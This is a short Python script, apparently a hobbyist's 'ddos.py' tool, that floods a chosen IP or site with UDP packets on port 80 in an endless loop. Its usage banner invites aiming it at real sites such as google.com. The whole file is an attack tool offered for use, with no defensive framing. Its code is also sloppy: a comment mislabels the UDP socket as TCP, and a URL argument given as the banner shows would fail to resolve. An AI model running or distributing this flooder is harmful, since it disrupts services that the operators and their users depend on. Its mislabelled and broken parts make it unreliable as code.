#!/usr/bin/python3
# Coder By ALi2004h {*Ali HemmatNia*}
# Github : github.com/ali2004-linux
# Version Python All Versions

import socket
import os
from sys import argv
from colorama import Fore
from platform import system

if system() == "Linux":
    os.system ("clear && clear")
else: 
    os.system ("cls && cls")

def banner():
    b = """
        \t    _    _ _ ____   ___   ___  _  _   _     
        \t   / \  | (_)___ \ / _ \ / _ \| || | | |__  
        \t  / _ \ | | | __) | | | | | | | || |_| '_ \ 
        \t / ___ \| | |/ __/| |_| | |_| |__   _| | | |
        \t/_/   \_\_|_|_____|\___/ \___/   |_| |_| |_|                                    
    """
    print(b)
    print(Fore.BLUE+"\n\t\t Github : https://Github.com/Ali2004-linux\n\t\t Gmail : ALi2004h.linux@gmail.com")
    print(Fore.RED+"\n\tUsage : python ddos.py http://target.com or Enter Ip Site!")
    print(Fore.GREEN+"\n\tExmple : python ddos.py http://google.com or python3 ddos.py 192.10.133.10")
    print(Fore.MAGENTA+"\t\t!!==>> Port Default in 80 If Edit Code for Your Port <==!!"+Fore.WHITE)
    print(Fore.GREEN+"\t\t\t\tAli2004h {Ali HemmatNia}"+Fore.WHITE)
def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #tcp connect
    try:
        ip = argv[1]
        f = 0
        t = b")P_NNRR$_R2Y_Y$Yryy3#7)&)#&##phe688epd33e43r864r74r4)#)*&rIGIPE"
        try:
            while(True):
                s.sendto(t, (ip,int(80)))
                f +=  1
                print(Fore.GREEN+"[***]"+Fore.WHITE+" Sending Packet To %s Count"%ip+Fore.BLUE+"[%d]!"%f+Fore.WHITE)
        except socket.gaierror:
            print(Fore.GREEN+"\n \t [*"+Fore.WHITE+"*"+Fore.GREEN+"*]"+Fore.RED+" Plaese Connect To Internet!! or Address Site NotFound\n")
    except IndexError:
        banner()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("ByBy")
        quit()
        print("ByBy")

